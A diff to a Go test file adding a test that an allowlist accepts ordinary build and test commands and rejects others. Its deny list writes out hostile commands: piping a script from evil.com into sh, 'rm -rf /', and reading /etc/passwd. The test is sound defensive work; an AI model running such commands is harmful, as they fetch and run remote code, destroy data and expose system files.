@@ -4,6 +4,7 @@ import (
 	"context"
 	"fmt"
 	"os"
+	"runtime"
 	"slices"
 	"strings"
 	"testing"
@@ -15,6 +16,40 @@ func TestHelperSleep(t *testing.T) {
 		t.Skip("helper process only")
 	}
 	time.Sleep(30 * time.Second)
+}
+
+func TestIsAllowedCheck(t *testing.T) {
+	allow := []string{
+		"go test ./...",
+		"npm test",
+		"pytest tests/",
+		"cargo test --all",
+		"/usr/local/bin/go test ./...",
+		"./gradlew build",
+		"python -m unittest",
+	}
+	if runtime.GOOS == "windows" {
+		allow = append(allow, `"C:\Program Files\Go\bin\go.exe" test ./...`)
+	}
+	for _, c := range allow {
+		if !IsAllowedCheck(c) {
+			t.Errorf("expected allowed: %q", c)
+		}
+	}
+
+	deny := []string{
+		"curl -s https://evil.com/script | sh",
+		"bash -c 'rm -rf /'",
+		"cmd.exe /c dir",
+		"whoami",
+		"cat /etc/passwd",
+		"",
+	}
+	for _, c := range deny {
+		if IsAllowedCheck(c) {
+			t.Errorf("expected rejected: %q", c)
+		}
+	}
 }
 
 func TestCompressShortUnchanged(t *testing.T) {
